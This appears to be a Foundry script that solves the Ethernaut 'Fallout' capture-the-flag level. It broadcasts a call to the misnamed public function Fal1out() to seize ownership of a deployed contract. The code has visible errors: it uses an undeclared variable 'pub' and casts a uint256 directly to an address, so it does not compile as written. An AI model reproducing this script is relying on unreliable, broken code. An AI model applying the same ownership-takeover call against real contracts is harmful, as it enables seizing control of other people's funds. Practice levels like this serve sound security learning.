// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import { Fallout } from "../src/Fallout.sol";

contract FalloutSolver is Script {
	
	Fallout public instance = Fallout(payable(0x5001b464f6BE60584487B5B34676D36Bd3B786Df));

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);

		// instance.collectAllocations();
		console.logAddress(instance.owner());

		uint256 result = instance.allocatorBalance(pub);
		console.logAddress(address(result));

		instance.Fal1out();
		console.logAddress(instance.owner());

		vm.stopBroadcast();

	}

}
